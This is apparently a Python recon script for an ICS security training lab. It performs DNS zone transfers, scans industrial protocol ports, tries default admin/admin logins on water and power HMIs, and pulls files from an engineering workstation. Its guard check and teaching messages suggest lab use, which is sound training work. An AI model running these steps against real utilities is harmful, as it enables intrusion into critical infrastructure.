#!/usr/bin/env python3
"""Scenarios 1-3 and 11, discovery.

  recon.py dns          enumerate the estate from the utility name server
  recon.py sweep        TCP-connect scan the hosts DNS just handed us
  recon.py creds        try the factory-default HMI logins
  recon.py engws        pull what the engineering workstation is sharing

Start with `dns`: on the flat range the utility name server answers for the
whole estate and allows a zone transfer, so one query maps every controller by
name. `sweep` then scans what `dns` found instead of walking a raw /24.
"""
import http.cookiejar
import socket
import subprocess
import sys
import urllib.request

import targets as T

ICS_PORTS = {502: "Modbus/TCP", 44818: "EtherNet/IP", 102: "S7comm",
             8080: "HTTP (HMI / runtime)", 22: "ssh", 20000: "DNP3"}


def _axfr(zone):
    """dig a zone transfer off the utility name server. Returns the raw text
    and a {fqdn: ip} map of the A records it leaked (empty if refused)."""
    try:
        out = subprocess.run(
            ["dig", "+noall", "+answer", "+time=3", "+tries=1",
             f"@{T.DNS_SERVER}", "axfr", zone],
            capture_output=True, text=True, timeout=8).stdout
    except Exception as exc:                       # dig missing, timeout
        return f"[-] {zone}: {exc}", {}
    hosts = {}
    for line in out.splitlines():
        f = line.split()
        if len(f) >= 5 and f[3] == "A":
            hosts[f[0].rstrip(".")] = f[4]
    return out.strip(), hosts


def dns():
    print(f"[*] utility name server: {T.DNS_SERVER}")
    estate = {}
    for zone in (T.WATER_DOMAIN, T.POWER_DOMAIN):
        print(f"\n[*] zone transfer  dig axfr @{T.DNS_SERVER} {zone}")
        raw, hosts = _axfr(zone)
        if hosts:
            for name, ip in hosts.items():
                print(f"    {name:<34} {ip}")
                estate[name] = ip
        else:
            print("    transfer refused or empty "
                  "(segmented range: split-horizon, AXFR off)")

    print(f"\n[*] reverse sweep of {T.OT_SUBNET}0/24  (dig -x / nmap -sL)")
    for i in range(1, 40):
        ip = T.OT_SUBNET + str(i)
        try:
            name = socket.gethostbyaddr(ip)[0]
        except OSError:
            continue
        print(f"    {ip:<16} {name}")
        estate.setdefault(name, ip)

    if estate:
        print(f"\n[+] {len(estate)} names resolved. feed them to: "
              "python3 recon.py sweep")
    print("[*] a real plant's name server has no business answering this "
          "from the internet")


def _targets():
    """Hosts to scan: whatever DNS will give us, else the known lab names,
    else the raw OT /24."""
    seen = {}
    for zone in (T.WATER_DOMAIN, T.POWER_DOMAIN):
        seen.update(_axfr(zone)[1])
    if not seen:
        for short, fqdn in T.HOSTS.items():
            try:
                seen[fqdn] = socket.gethostbyname(fqdn)
            except OSError:
                pass
    if not seen:
        print("[!] DNS gave us nothing, falling back to a raw address sweep")
        seen = {T.OT_SUBNET + str(i): T.OT_SUBNET + str(i)
                for i in range(1, 40)}
    return seen


def sweep():
    targets = _targets()
    print(f"[*] TCP-connect sweep of {len(targets)} host(s)")
    for name, host in sorted(targets.items(), key=lambda kv: kv[1]):
        try:
            host = T.guard(host)
        except SystemExit as exc:
            print(f"    {name:<34} skipped ({exc})")
            continue
        open_ports = []
        for port in ICS_PORTS:
            s = socket.socket()
            s.settimeout(0.3)
            if s.connect_ex((host, port)) == 0:
                open_ports.append(port)
            s.close()
        if open_ports:
            desc = ", ".join(f"{p}/{ICS_PORTS[p]}" for p in open_ports)
            label = name if name != host else name
            print(f"    {label:<34} {host:<16} {desc}")
    ports = ",".join(str(p) for p in ICS_PORTS)
    print(f"\n[*] same scan with the real tool:\n"
          f"    nmap -Pn -sT -p {ports} {T.WATER_DOMAIN} {T.POWER_DOMAIN}\n"
          f"    nmap -Pn -sL {T.OT_SUBNET}0/24        # names only, via the resolver")
    print("[*] the internet should never be able to run this against a real plant")


def creds():
    for name, host in (("water HMI", T.HMI_WATER), ("power HMI", T.HMI_POWER)):
        url = f"http://{host}:{T.HTTP_PORT}/login"
        data = b"username=admin&password=admin"
        try:
            # carry the session cookie through the post-login redirect
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
            req = urllib.request.Request(url, data=data)
            with opener.open(req, timeout=3) as r:
                body = r.read(4000).decode("utf-8", "replace")
            # a rejected login re-renders the form; an accepted one lands on
            # the operator screen and has no password field
            hit = 'type="password"' not in body
            print(f"[{'+' if hit else '-'}] {name} admin/admin -> "
                  f"{'ACCEPTED' if hit else 'rejected'}")
        except Exception as exc:
            print(f"[-] {name}: {exc}")


def engws():
    for path in ("/", "/notes.txt", "/water_plc.st"):
        url = f"http://{T.ENG_WS}:{T.HTTP_PORT}{path}"
        try:
            with urllib.request.urlopen(url, timeout=3) as r:
                body = r.read(4000).decode("utf-8", "replace")
            print(f"--- {url} ---\n{body}\n")
        except Exception as exc:
            print(f"[-] {url}: {exc}")


if __name__ == "__main__":
    {"dns": dns, "sweep": sweep, "creds": creds, "engws": engws}.get(
        sys.argv[1] if len(sys.argv) > 1 else "dns",
        lambda: print(__doc__),
    )()
